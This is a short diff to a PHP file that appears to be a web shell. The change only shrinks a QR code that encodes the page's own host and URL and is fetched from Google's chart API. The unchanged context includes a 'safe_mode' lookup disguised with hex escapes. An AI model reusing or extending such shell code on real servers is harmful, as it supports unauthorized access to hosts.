@@ -1119,7 +1119,7 @@ echo getcfg("s\x61f\x65_mo\x64e");
 	
 
 	p('<a rel="nofollow" href="http://www.qrcode-generator.de" border="0" style="cursor:default">
-	<img src="https://chart.googleapis.com/chart?cht=qr&chl=http%3A%2F%2F'.$_SERVER['HTTP_HOST'].''.$_SERVER['REQUEST_URI'].'&chs=180x180&choe=UTF-8&chld=L|2" alt=""></a>
+	<img src="https://chart.googleapis.com/chart?cht=qr&chl=http%3A%2F%2F'.$_SERVER['HTTP_HOST'].''.$_SERVER['REQUEST_URI'].'&chs=80x80&choe=UTF-8&chld=L|2" alt=""></a>
 	');
 	
 
